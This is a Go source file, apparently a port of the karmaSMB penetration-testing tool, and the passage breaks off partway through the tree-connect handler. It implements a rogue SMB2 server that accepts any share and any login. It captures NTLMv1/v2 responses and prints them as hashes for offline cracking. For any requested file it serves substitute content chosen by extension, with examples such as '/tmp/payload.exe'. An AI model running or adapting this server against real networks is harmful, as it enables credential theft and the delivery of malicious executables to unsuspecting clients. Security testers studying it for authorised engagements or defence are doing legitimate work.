// SPDX-License-Identifier: Apache-2.0

package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"gopacket/pkg/flags"
)

var (
	logger  *log.Logger
	logFile *os.File
)

// initLogging sets up the logger with optional timestamps and file output
func initLogging() {
	var output io.Writer = os.Stdout

	// Set up output file if specified
	if *outputFile != "" {
		f, err := os.OpenFile(*outputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to open output file: %v\n", err)
			os.Exit(1)
		}
		logFile = f
		output = io.MultiWriter(os.Stdout, f)
	}

	// Set up logger with or without timestamps
	flags := 0
	if *timestamp {
		flags = log.Ldate | log.Ltime
	}
	logger = log.New(output, "", flags)
}

// logOutput prints a message with optional timestamp
func logOutput(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	logger.Print(msg)
}

var (
	listenAddr  = flag.String("ip", "0.0.0.0", "ip address of listening interface")
	listenPort  = flag.Int("port", 445, "TCP port for listening incoming connections (default 445)")
	smb2support = flag.Bool("smb2support", false, "SMB2 Support (experimental!)")
	debugFlag   = flag.Bool("debug", false, "Turn DEBUG output ON")
	timestamp   = flag.Bool("ts", false, "Adds timestamp to every logging output")
	outputFile  = flag.String("outputfile", "", "Output file to log messages")
	configFile  = flag.String("config", "", "Config file mapping extensions to files (format: ext = /path/to/file)")
)

// SMB2 Commands
const (
	SMB2_NEGOTIATE       uint16 = 0x0000
	SMB2_SESSION_SETUP   uint16 = 0x0001
	SMB2_LOGOFF          uint16 = 0x0002
	SMB2_TREE_CONNECT    uint16 = 0x0003
	SMB2_TREE_DISCONNECT uint16 = 0x0004
	SMB2_CREATE          uint16 = 0x0005
	SMB2_CLOSE           uint16 = 0x0006
	SMB2_FLUSH           uint16 = 0x0007
	SMB2_READ            uint16 = 0x0008
	SMB2_WRITE           uint16 = 0x0009
	SMB2_LOCK            uint16 = 0x000a
	SMB2_IOCTL           uint16 = 0x000b
	SMB2_CANCEL          uint16 = 0x000c
	SMB2_ECHO            uint16 = 0x000d
	SMB2_QUERY_DIRECTORY uint16 = 0x000e
	SMB2_CHANGE_NOTIFY   uint16 = 0x000f
	SMB2_QUERY_INFO      uint16 = 0x0010
	SMB2_SET_INFO        uint16 = 0x0011
	SMB2_OPLOCK_BREAK    uint16 = 0x0012
)

// SMB2 Status codes
const (
	STATUS_SUCCESS                  uint32 = 0x00000000
	STATUS_PENDING                  uint32 = 0x00000103
	STATUS_MORE_PROCESSING_REQUIRED uint32 = 0xC0000016
	STATUS_LOGON_FAILURE            uint32 = 0xC000006D
	STATUS_ACCESS_DENIED            uint32 = 0xC0000022
	STATUS_OBJECT_NAME_NOT_FOUND    uint32 = 0xC0000034
	STATUS_OBJECT_PATH_NOT_FOUND    uint32 = 0xC000003A
	STATUS_NO_SUCH_FILE             uint32 = 0xC000000F
	STATUS_END_OF_FILE              uint32 = 0xC0000011
	STATUS_NOT_SUPPORTED            uint32 = 0xC00000BB
	STATUS_INVALID_PARAMETER        uint32 = 0xC000000D
	STATUS_NO_MORE_FILES            uint32 = 0x80000006
	STATUS_FILE_IS_A_DIRECTORY      uint32 = 0xC00000BA
	STATUS_NOT_A_DIRECTORY          uint32 = 0xC0000103
)

// CreateDisposition values
const (
	FILE_SUPERSEDE    uint32 = 0x00000000
	FILE_OPEN         uint32 = 0x00000001
	FILE_CREATE       uint32 = 0x00000002
	FILE_OPEN_IF      uint32 = 0x00000003
	FILE_OVERWRITE    uint32 = 0x00000004
	FILE_OVERWRITE_IF uint32 = 0x00000005
)

// CreateOptions flags
const (
	FILE_DIRECTORY_FILE     uint32 = 0x00000001
	FILE_NON_DIRECTORY_FILE uint32 = 0x00000040
	FILE_DELETE_ON_CLOSE    uint32 = 0x00001000
)

// DesiredAccess flags
const (
	DELETE                uint32 = 0x00010000
	FILE_READ_DATA        uint32 = 0x00000001
	FILE_WRITE_DATA       uint32 = 0x00000002
	FILE_APPEND_DATA      uint32 = 0x00000004
	FILE_READ_ATTRIBUTES  uint32 = 0x00000080
	FILE_WRITE_ATTRIBUTES uint32 = 0x00000100
	FILE_LIST_DIRECTORY   uint32 = 0x00000001
	SYNCHRONIZE           uint32 = 0x00100000
	GENERIC_READ          uint32 = 0x80000000
	GENERIC_WRITE         uint32 = 0x40000000
	GENERIC_EXECUTE       uint32 = 0x20000000
	GENERIC_ALL           uint32 = 0x10000000
)

// SMB2 Header flags
const (
	SMB2_FLAGS_SERVER_TO_REDIR uint32 = 0x00000001
)

// SMB2 Negotiate signing capabilities
const (
	SMB2_NEGOTIATE_SIGNING_ENABLED  uint16 = 0x0001
	SMB2_NEGOTIATE_SIGNING_REQUIRED uint16 = 0x0002
)

// SMB2 Capabilities
const (
	SMB2_GLOBAL_CAP_DFS           uint32 = 0x00000001
	SMB2_GLOBAL_CAP_LEASING       uint32 = 0x00000002
	SMB2_GLOBAL_CAP_LARGE_MTU     uint32 = 0x00000004
	SMB2_GLOBAL_CAP_MULTI_CHANNEL uint32 = 0x00000008
)

// SMB2 Dialects
const (
	SMB2_DIALECT_202  uint16 = 0x0202
	SMB2_DIALECT_21   uint16 = 0x0210
	SMB2_DIALECT_30   uint16 = 0x0300
	SMB2_DIALECT_302  uint16 = 0x0302
	SMB2_DIALECT_311  uint16 = 0x0311
	SMB2_DIALECT_WILD uint16 = 0x02FF
)

// Server represents the Karma SMB server
type Server struct {
	listener    net.Listener
	sessions    map[uint64]*Session
	sessionMu   sync.RWMutex
	nextSession uint64
	serverGUID  [16]byte

	// Karma config
	defaultFile string            // File to serve when no extension match
	extensions  map[string]string // extension (uppercase) -> file path

	// Settings
	smb2Enabled bool
	debug       bool
}

// Session represents an SMB session
type Session struct {
	id                uint64
	conn              net.Conn
	authenticated     bool
	username          string
	domain            string
	challenge         []byte // NTLM challenge
	treeConnects      map[uint32]*TreeConnect
	nextTreeID        uint32
	openFiles         map[string]*OpenFile
	nextFileID        uint64
	negotiatedDialect uint16
	clientIP          string
	// Track for directory listing state
	findDone       bool
	stopConnection bool
	fileData       struct {
		origName   string
		targetFile string
	}
}

// TreeConnect represents a tree connection
type TreeConnect struct {
	id        uint32
	shareName string
	isIPC     bool
}

// OpenFile represents an open file handle
type OpenFile struct {
	id         [16]byte
	path       string // Original path requested
	realPath   string // Actual file on disk
	isDir      bool
	file       *os.File
	enumerated bool
	origName   string // Original filename requested (for directory listing)
	// Named pipe support
	isPipe   bool
	pipeName string
	pipeData *NamedPipeState
}

// NamedPipeState tracks DCE/RPC state for named pipes
type NamedPipeState struct {
	bound           bool
	callID          uint32
	contextID       uint16
	pendingResponse []byte
}

// DCE/RPC constants
const (
	DCERPC_VERSION       = 5
	DCERPC_VERSION_MINOR = 0

	DCERPC_REQUEST  = 0
	DCERPC_RESPONSE = 2
	DCERPC_BIND     = 11
	DCERPC_BIND_ACK = 12

	DCERPC_FIRST_FRAG = 0x01
	DCERPC_LAST_FRAG  = 0x02

	SRVSVC_OPNUM_NetrShareEnum = 15
)

// NDR UUID for transfer syntax
var NDR_UUID = []byte{
	0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
	0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
}

func main() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "gopacket v0.1.0 - KarmaSMB\n\n")
		fmt.Fprintf(os.Stderr, "For every file request received, this module will return the pathname\n")
		fmt.Fprintf(os.Stderr, "contents based on extension matching.\n\n")
		fmt.Fprintf(os.Stderr, "Usage: karmaSMB [options] pathname\n\n")
		fmt.Fprintf(os.Stderr, "positional arguments:\n")
		fmt.Fprintf(os.Stderr, "  pathname              Pathname's contents to deliver to SMB clients\n\n")
		fmt.Fprintf(os.Stderr, "options:\n")
		fmt.Fprintf(os.Stderr, "  -h                    show this help message and exit\n")
		fmt.Fprintf(os.Stderr, "  -config pathname      config file name to map extensions to files to deliver\n")
		fmt.Fprintf(os.Stderr, "                        For those extensions not present, pathname will be delivered\n")
		fmt.Fprintf(os.Stderr, "                        Format: ext = /path/to/file (one per line)\n")
		fmt.Fprintf(os.Stderr, "  -smb2support          SMB2 Support (experimental!)\n")
		fmt.Fprintf(os.Stderr, "  -ts                   Adds timestamp to every logging output\n")
		fmt.Fprintf(os.Stderr, "  -debug                Turn DEBUG output ON\n")
		fmt.Fprintf(os.Stderr, "  -ip INTERFACE_ADDRESS ip address of listening interface (default 0.0.0.0)\n")
		fmt.Fprintf(os.Stderr, "  -port PORT            TCP port for listening incoming connections (default 445)\n")
		fmt.Fprintf(os.Stderr, "  -outputfile OUTPUTFILE Output file to log messages\n\n")
		fmt.Fprintf(os.Stderr, "Config file format example:\n")
		fmt.Fprintf(os.Stderr, "  bat = /tmp/batchfile\n")
		fmt.Fprintf(os.Stderr, "  com = /tmp/comfile\n")
		fmt.Fprintf(os.Stderr, "  exe = /tmp/exefile\n\n")
		fmt.Fprintf(os.Stderr, "Examples:\n")
		fmt.Fprintf(os.Stderr, "  karmaSMB /tmp/default.txt\n")
		fmt.Fprintf(os.Stderr, "  karmaSMB -config extensions.conf /tmp/default.txt\n")
		fmt.Fprintf(os.Stderr, "  karmaSMB -smb2support -config extensions.conf /tmp/payload.exe\n")
	}

	// Check for -h anywhere in args
	flags.CheckHelp()

	flag.Parse()

	if flag.NArg() < 1 {
		flag.Usage()
		os.Exit(1)
	}

	// Set up logging
	initLogging()
	defer func() {
		if logFile != nil {
			logFile.Close()
		}
	}()

	defaultFile := flag.Arg(0)

	// Validate default file exists
	if _, err := os.Stat(defaultFile); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Default file does not exist: %v\n", err)
		os.Exit(1)
	}

	server := &Server{
		sessions:    make(map[uint64]*Session),
		smb2Enabled: *smb2support,
		debug:       *debugFlag,
		defaultFile: defaultFile,
		extensions:  make(map[string]string),
	}

	// Parse config file if provided
	if *configFile != "" {
		if err := server.loadConfig(*configFile); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to load config: %v\n", err)
			os.Exit(1)
		}
	}

	// Generate server GUID
	rand.Read(server.serverGUID[:])

	addr := fmt.Sprintf("%s:%d", *listenAddr, *listenPort)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to listen on %s: %v\n", addr, err)
		os.Exit(1)
	}
	server.listener = listener

	logOutput("[*] Setting up Karma SMB Server\n")
	logOutput("[*] Default file: %s\n", defaultFile)
	if len(server.extensions) > 0 {
		logOutput("[*] Extension mappings:\n")
		for ext, path := range server.extensions {
			logOutput("    .%s -> %s\n", strings.ToLower(ext), path)
		}
	}
	logOutput("[*] Listening on %s\n", addr)
	logOutput("[*] Servers started, waiting for connections\n")

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go server.handleConnection(conn)
	}
}

// loadConfig loads extension->file mappings from config file
func (s *Server) loadConfig(path string) error {
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// Skip comments and empty lines
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}

		ext := strings.TrimSpace(parts[0])
		path := strings.TrimSpace(parts[1])

		// Validate file exists
		if _, err := os.Stat(path); err != nil {
			logOutput("[!] Warning: extension file does not exist: %s\n", path)
			continue
		}

		s.extensions[strings.ToUpper(ext)] = path
	}

	return scanner.Err()
}

// getFileForExtension returns the file to serve based on extension
func (s *Server) getFileForExtension(filename string) string {
	ext := strings.ToUpper(strings.TrimPrefix(filepath.Ext(filename), "."))
	if path, ok := s.extensions[ext]; ok {
		return path
	}
	return s.defaultFile
}

func (s *Server) handleConnection(conn net.Conn) {
	defer conn.Close()

	clientIP := conn.RemoteAddr().String()
	if idx := strings.LastIndex(clientIP, ":"); idx != -1 {
		clientIP = clientIP[:idx]
	}

	logOutput("[*] Incoming connection from %s\n", clientIP)

	session := &Session{
		id:           s.nextSession,
		conn:         conn,
		treeConnects: make(map[uint32]*TreeConnect),
		nextTreeID:   1,
		openFiles:    make(map[string]*OpenFile),
		clientIP:     clientIP,
	}

	s.sessionMu.Lock()
	s.sessions[session.id] = session
	s.nextSession++
	s.sessionMu.Unlock()

	defer func() {
		s.sessionMu.Lock()
		delete(s.sessions, session.id)
		s.sessionMu.Unlock()
	}()

	buf := make([]byte, 65536)
	for {
		conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
		n, err := conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				if s.debug {
					fmt.Printf("[DEBUG] Read error from %s: %v\n", clientIP, err)
				}
			}
			return
		}

		if n < 4 {
			continue
		}

		// Parse NetBIOS session header
		pktLen := int(buf[1])<<16 | int(buf[2])<<8 | int(buf[3])
		if n < 4+pktLen || pktLen < 4 {
			continue
		}

		pkt := buf[4 : 4+pktLen]

		// Check for SMB1 header (multi-protocol negotiate from Windows)
		if len(pkt) >= 4 && pkt[0] == 0xFF && pkt[1] == 'S' && pkt[2] == 'M' && pkt[3] == 'B' {
			if s.smb2Enabled {
				// Respond with SMB2 NEGOTIATE including SPNEGO token
				resp := s.buildNegotiateResponse(0)
				if resp != nil {
					s.sendResponse(conn, resp)
				}
			}
			continue
		}

		// Check for SMB2 header
		if bytes.Equal(pkt[:4], []byte{0xFE, 'S', 'M', 'B'}) {
			if !s.smb2Enabled {
				continue
			}
			resp := s.handleSMB2Packet(session, pkt)
			if resp != nil {
				s.sendResponse(conn, resp)
			}
		}
	}
}

func (s *Server) sendResponse(conn net.Conn, data []byte) {
	// Add NetBIOS header
	header := make([]byte, 4)
	header[0] = 0
	header[1] = byte(len(data) >> 16)
	header[2] = byte(len(data) >> 8)
	header[3] = byte(len(data))

	conn.Write(append(header, data...))
}

func (s *Server) handleSMB2Packet(session *Session, pkt []byte) []byte {
	if len(pkt) < 64 {
		return nil
	}

	command := binary.LittleEndian.Uint16(pkt[12:14])
	messageID := binary.LittleEndian.Uint64(pkt[24:32])
	treeID := binary.LittleEndian.Uint32(pkt[36:40])

	switch command {
	case SMB2_NEGOTIATE:
		return s.handleNegotiate(session, pkt, messageID)
	case SMB2_SESSION_SETUP:
		return s.handleSessionSetup(session, pkt, messageID)
	case SMB2_TREE_CONNECT:
		return s.handleTreeConnect(session, pkt, messageID)
	case SMB2_TREE_DISCONNECT:
		return s.handleTreeDisconnect(session, pkt, messageID, treeID)
	case SMB2_CREATE:
		return s.handleCreate(session, pkt, messageID, treeID)
	case SMB2_CLOSE:
		return s.handleClose(session, pkt, messageID, treeID)
	case SMB2_READ:
		return s.handleRead(session, pkt, messageID, treeID)
	case SMB2_WRITE:
		return s.handleWrite(session, pkt, messageID, treeID)
	case SMB2_QUERY_DIRECTORY:
		return s.handleQueryDirectory(session, pkt, messageID, treeID)
	case SMB2_QUERY_INFO:
		return s.handleQueryInfo(session, pkt, messageID, treeID)
	case SMB2_ECHO:
		return s.handleEcho(session, pkt, messageID)
	default:
		return s.buildErrorResponse(command, messageID, session.id, treeID, STATUS_NOT_SUPPORTED)
	}
}

// SPNEGO NegTokenInit with NTLMSSP mechanism OID
// GSS-API wrapper (OID 1.3.6.1.5.5.2) containing NegTokenInit with mechType NTLMSSP (1.3.6.1.4.1.311.2.2.10)
var spnegoNegotiateToken = []byte{
	0x60, 0x1c, // Application tag 0, length 28
	0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, // OID 1.3.6.1.5.5.2 (SPNEGO)
	0xa0, 0x12, // Context tag 0 (NegTokenInit), length 18
	0x30, 0x10, // SEQUENCE, length 16
	0xa0, 0x0e, // Context tag 0 (mechTypes), length 14
	0x30, 0x0c, // SEQUENCE, length 12
	0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, // OID 1.3.6.1.4.1.311.2.2.10 (NTLMSSP)
}

// buildNegotiateResponse creates an SMB2 NEGOTIATE response with SPNEGO security blob
func (s *Server) buildNegotiateResponse(messageID uint64) []byte {
	secBlobLen := len(spnegoNegotiateToken)
	bodyLen := 64 + secBlobLen // negotiate body fixed (64) + security blob
	resp := make([]byte, 64+bodyLen)

	// SMB2 header
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)               // StructureSize
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)  // Status
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_NEGOTIATE) // Command
	binary.LittleEndian.PutUint16(resp[14:16], 1)              // CreditResponse
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)

	// Negotiate response body
	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 65)                             // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], SMB2_NEGOTIATE_SIGNING_ENABLED) // SecurityMode
	binary.LittleEndian.PutUint16(body[4:6], SMB2_DIALECT_202)               // DialectRevision = 0x0202
	binary.LittleEndian.PutUint16(body[6:8], 0)                              // Reserved
	copy(body[8:24], s.serverGUID[:])                                        // ServerGuid
	binary.LittleEndian.PutUint32(body[24:28], 0)                            // Capabilities (none)
	binary.LittleEndian.PutUint32(body[28:32], 65536)                        // MaxTransactSize
	binary.LittleEndian.PutUint32(body[32:36], 65536)                        // MaxReadSize
	binary.LittleEndian.PutUint32(body[36:40], 65536)                        // MaxWriteSize
	now := uint64(time.Now().UnixNano()/100 + 116444736000000000)
	binary.LittleEndian.PutUint64(body[40:48], now)                // SystemTime
	binary.LittleEndian.PutUint64(body[48:56], now)                // ServerStartTime
	binary.LittleEndian.PutUint16(body[56:58], uint16(64+64))      // SecurityBufferOffset (header + fixed body)
	binary.LittleEndian.PutUint16(body[58:60], uint16(secBlobLen)) // SecurityBufferLength
	copy(body[64:], spnegoNegotiateToken)                          // SecurityBuffer

	return resp
}

func (s *Server) handleNegotiate(session *Session, pkt []byte, messageID uint64) []byte {
	session.negotiatedDialect = SMB2_DIALECT_202
	return s.buildNegotiateResponse(messageID)
}

func (s *Server) handleSessionSetup(session *Session, pkt []byte, messageID uint64) []byte {
	if len(pkt) < 64+25 {
		return s.buildErrorResponse(SMB2_SESSION_SETUP, messageID, session.id, 0, STATUS_INVALID_PARAMETER)
	}

	// Parse Session Setup Request
	secBufOffset := binary.LittleEndian.Uint16(pkt[76:78])
	secBufLen := binary.LittleEndian.Uint16(pkt[78:80])

	if int(secBufOffset)+int(secBufLen) > len(pkt) {
		return s.buildErrorResponse(SMB2_SESSION_SETUP, messageID, session.id, 0, STATUS_INVALID_PARAMETER)
	}

	securityBuffer := pkt[secBufOffset : secBufOffset+secBufLen]

	// Parse NTLM message
	return s.handleNTLMAuth(session, securityBuffer, messageID)
}

func (s *Server) handleNTLMAuth(session *Session, secBuffer []byte, messageID uint64) []byte {
	// Check for SPNEGO wrapper or raw NTLM
	var ntlmMsg []byte

	if len(secBuffer) > 7 {
		// Try to find NTLMSSP signature
		idx := bytes.Index(secBuffer, []byte("NTLMSSP\x00"))
		if idx >= 0 {
			ntlmMsg = secBuffer[idx:]
		}
	}

	if ntlmMsg == nil || len(ntlmMsg) < 12 {
		// No valid NTLM, accept as anonymous
		session.authenticated = true
		logOutput("[*] %s authenticated (anonymous)\n", session.clientIP)
		spnegoResp := s.wrapInSPNEGO(nil, false)
		return s.buildSessionSetupResponse(session, messageID, STATUS_SUCCESS, spnegoResp)
	}

	// Get message type
	msgType := binary.LittleEndian.Uint32(ntlmMsg[8:12])

	switch msgType {
	case 1: // NEGOTIATE
		return s.handleNTLMNegotiate(session, messageID)
	case 3: // AUTHENTICATE
		return s.handleNTLMAuthenticate(session, ntlmMsg, messageID)
	default:
		return s.buildErrorResponse(SMB2_SESSION_SETUP, messageID, session.id, 0, STATUS_INVALID_PARAMETER)
	}
}

func (s *Server) handleNTLMNegotiate(session *Session, messageID uint64) []byte {
	// Generate challenge
	session.challenge = make([]byte, 8)
	rand.Read(session.challenge)

	// Build NTLM Challenge (Type 2)
	challenge := s.buildNTLMChallenge(session.challenge)

	// Wrap in SPNEGO
	spnegoResp := s.wrapInSPNEGO(challenge, true)

	// Build Session Setup Response with MORE_PROCESSING_REQUIRED
	return s.buildSessionSetupResponse(session, messageID, STATUS_MORE_PROCESSING_REQUIRED, spnegoResp)
}

func (s *Server) buildNTLMChallenge(challenge []byte) []byte {
	targetName := "KARMA"
	targetNameUTF16 := utf16LEEncode(targetName)
	domainName := "WORKGROUP"
	domainNameUTF16 := utf16LEEncode(domainName)

	// Build Target Info (AV_PAIRs)
	var targetInfo bytes.Buffer
	// MsvAvNbDomainName (type 2)
	binary.Write(&targetInfo, binary.LittleEndian, uint16(2))
	binary.Write(&targetInfo, binary.LittleEndian, uint16(len(domainNameUTF16)))
	targetInfo.Write(domainNameUTF16)
	// MsvAvNbComputerName (type 1)
	binary.Write(&targetInfo, binary.LittleEndian, uint16(1))
	binary.Write(&targetInfo, binary.LittleEndian, uint16(len(targetNameUTF16)))
	targetInfo.Write(targetNameUTF16)
	// MsvAvDnsDomainName (type 4)
	binary.Write(&targetInfo, binary.LittleEndian, uint16(4))
	binary.Write(&targetInfo, binary.LittleEndian, uint16(len(domainNameUTF16)))
	targetInfo.Write(domainNameUTF16)
	// MsvAvDnsComputerName (type 3)
	binary.Write(&targetInfo, binary.LittleEndian, uint16(3))
	binary.Write(&targetInfo, binary.LittleEndian, uint16(len(targetNameUTF16)))
	targetInfo.Write(targetNameUTF16)
	// MsvAvTimestamp (type 7)
	binary.Write(&targetInfo, binary.LittleEndian, uint16(7))
	binary.Write(&targetInfo, binary.LittleEndian, uint16(8))
	binary.Write(&targetInfo, binary.LittleEndian, fileTimeFromTime(time.Now()))
	// MsvAvEOL (type 0)
	binary.Write(&targetInfo, binary.LittleEndian, uint16(0))
	binary.Write(&targetInfo, binary.LittleEndian, uint16(0))

	targetInfoBytes := targetInfo.Bytes()

	// Calculate offsets
	targetNameOffset := uint32(56)
	targetInfoOffset := targetNameOffset + uint32(len(targetNameUTF16))

	msgLen := 56 + len(targetNameUTF16) + len(targetInfoBytes)
	msg := make([]byte, msgLen)

	// Signature
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	// Type
	binary.LittleEndian.PutUint32(msg[8:12], 2)
	// TargetName fields
	binary.LittleEndian.PutUint16(msg[12:14], uint16(len(targetNameUTF16)))
	binary.LittleEndian.PutUint16(msg[14:16], uint16(len(targetNameUTF16)))
	binary.LittleEndian.PutUint32(msg[16:20], targetNameOffset)
	// Flags
	flags := uint32(0x628a0215)
	binary.LittleEndian.PutUint32(msg[20:24], flags)
	// Challenge
	copy(msg[24:32], challenge)
	// Reserved
	binary.LittleEndian.PutUint64(msg[32:40], 0)
	// TargetInfo fields
	binary.LittleEndian.PutUint16(msg[40:42], uint16(len(targetInfoBytes)))
	binary.LittleEndian.PutUint16(msg[42:44], uint16(len(targetInfoBytes)))
	binary.LittleEndian.PutUint32(msg[44:48], targetInfoOffset)
	// Version
	msg[48] = 6
	msg[49] = 1
	binary.LittleEndian.PutUint16(msg[50:52], 7600)
	msg[55] = 15

	// Target name
	copy(msg[56:], targetNameUTF16)
	// Target info
	copy(msg[targetInfoOffset:], targetInfoBytes)

	return msg
}

func (s *Server) handleNTLMAuthenticate(session *Session, ntlmMsg []byte, messageID uint64) []byte {
	if len(ntlmMsg) < 52 {
		return s.buildErrorResponse(SMB2_SESSION_SETUP, messageID, session.id, 0, STATUS_INVALID_PARAMETER)
	}

	// Parse NTLM Type 3 (Authenticate) message
	lmLen := binary.LittleEndian.Uint16(ntlmMsg[12:14])
	lmOffset := binary.LittleEndian.Uint32(ntlmMsg[16:20])
	ntLen := binary.LittleEndian.Uint16(ntlmMsg[20:22])
	ntOffset := binary.LittleEndian.Uint32(ntlmMsg[24:28])
	domainLen := binary.LittleEndian.Uint16(ntlmMsg[28:30])
	domainOffset := binary.LittleEndian.Uint32(ntlmMsg[32:36])
	userLen := binary.LittleEndian.Uint16(ntlmMsg[36:38])
	userOffset := binary.LittleEndian.Uint32(ntlmMsg[40:44])

	// Extract fields
	var lmResponse, ntResponse []byte
	var domain, user string

	if lmLen > 0 && int(lmOffset)+int(lmLen) <= len(ntlmMsg) {
		lmResponse = ntlmMsg[lmOffset : lmOffset+uint32(lmLen)]
	}
	if ntLen > 0 && int(ntOffset)+int(ntLen) <= len(ntlmMsg) {
		ntResponse = ntlmMsg[ntOffset : ntOffset+uint32(ntLen)]
	}
	if domainLen > 0 && int(domainOffset)+int(domainLen) <= len(ntlmMsg) {
		domain = utf16LEDecode(ntlmMsg[domainOffset : domainOffset+uint32(domainLen)])
	}
	if userLen > 0 && int(userOffset)+int(userLen) <= len(ntlmMsg) {
		user = utf16LEDecode(ntlmMsg[userOffset : userOffset+uint32(userLen)])
	}

	session.username = user
	session.domain = domain

	// Print captured NTLM response for offline cracking.
	s.printCapturedHash(user, domain, session.challenge, lmResponse, ntResponse)

	// Authentication always successful in karma mode
	session.authenticated = true
	logOutput("[+] %s authenticated: %s\\%s\n", session.clientIP, domain, user)

	// Build SPNEGO accept-complete response
	spnegoResp := s.wrapInSPNEGO(nil, false)
	return s.buildSessionSetupResponse(session, messageID, STATUS_SUCCESS, spnegoResp)
}

func (s *Server) printCapturedHash(user, domain string, challenge, lmResponse, ntResponse []byte) {
	if len(ntResponse) == 0 {
		return
	}

	logOutput("\n[*] NTLM Hash captured from %s\\%s\n", domain, user)
	logOutput("[*] Challenge: %s\n", hex.EncodeToString(challenge))

	if len(ntResponse) > 24 {
		// NTLMv2
		ntProofStr := ntResponse[:16]
		blob := ntResponse[16:]

		logOutput("\n[*] NTLMv2-SSP Hash:\n")
		logOutput("%s::%s:%s:%s:%s\n",
			user,
			domain,
			hex.EncodeToString(challenge),
			hex.EncodeToString(ntProofStr),
			hex.EncodeToString(blob))
	} else if len(ntResponse) == 24 {
		// NTLMv1
		logOutput("\n[*] NTLMv1 Hash:\n")
		logOutput("%s::%s:%s:%s:%s\n",
			user,
			domain,
			hex.EncodeToString(lmResponse),
			hex.EncodeToString(ntResponse),
			hex.EncodeToString(challenge))
	}
	logOutput("\n")
}

func (s *Server) wrapInSPNEGO(ntlmToken []byte, isChallenge bool) []byte {
	var innerBuf bytes.Buffer

	if isChallenge {
		// negState [0] ENUMERATED { accept-incomplete (1) }
		innerBuf.Write([]byte{0xa0, 0x03, 0x0a, 0x01, 0x01})
		// supportedMech [1] OID (NTLM: 1.3.6.1.4.1.311.2.2.10)
		innerBuf.Write([]byte{0xa1, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a})
		// responseToken [2] OCTET STRING
		responseToken := asn1Wrap(0xa2, asn1Wrap(0x04, ntlmToken))
		innerBuf.Write(responseToken)
	} else {
		// negState [0] ENUMERATED { accept-completed (0) }
		innerBuf.Write([]byte{0xa0, 0x03, 0x0a, 0x01, 0x00})
	}

	// Wrap in SEQUENCE
	inner := asn1Wrap(0x30, innerBuf.Bytes())
	// Wrap in NegTokenResp [1]
	return asn1Wrap(0xa1, inner)
}

func asn1Wrap(tag byte, data []byte) []byte {
	length := len(data)
	if length < 128 {
		return append([]byte{tag, byte(length)}, data...)
	} else if length < 256 {
		return append([]byte{tag, 0x81, byte(length)}, data...)
	} else {
		return append([]byte{tag, 0x82, byte(length >> 8), byte(length)}, data...)
	}
}

func (s *Server) buildSessionSetupResponse(session *Session, messageID uint64, status uint32, secBuffer []byte) []byte {
	respLen := 64 + 9 + len(secBuffer)
	resp := make([]byte, respLen)

	// SMB2 Header
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], status)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_SESSION_SETUP)
	binary.LittleEndian.PutUint16(resp[14:16], 0x2000) // Credits
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id)

	// Session Setup Response
	binary.LittleEndian.PutUint16(resp[64:66], 9)
	binary.LittleEndian.PutUint16(resp[66:68], 0x0001) // SessionFlags = IS_GUEST
	binary.LittleEndian.PutUint16(resp[68:70], 72)     // SecurityBufferOffset
	binary.LittleEndian.PutUint16(resp[70:72], uint16(len(secBuffer)))

	copy(resp[72:], secBuffer)
	return resp
}

func (s *Server) handleTreeConnect(session *Session, pkt []byte, messageID uint64) []byte {
	// Parse path from request
	if len(pkt) < 64+9 {
		return s.buildErrorResponse(SMB2_TREE_CONNECT, messageID, session.id, 0, STATUS_INVALID_PARAMETER)
	}

	pathOffset := binary.LittleEndian.Uint16(pkt[64+4 : 64+6])
	pathLen := binary.LittleEndian.Uint16(pkt[64+6 : 64+8])

	var shareName string
	if pathLen > 0 && int(pathOffset)+int(pathLen) <= len(pkt) {
		path := utf16LEDecode(pkt[pathOffset : pathOffset+pathLen])
		// Extract share name from UNC path
		parts := strings.Split(strings.Trim(path, "\\"), "\\")
		if len(parts) > 1 {
			shareName = parts[len(parts)-1]
		} else {
			shareName = path
		}
	}

	// Check if IPC$
	isIPC := strings.ToUpper(shareName) == "IPC$"

	// In karma mode, we accept ANY share name
	tid := session.nextTreeID
	session.nextTreeID++

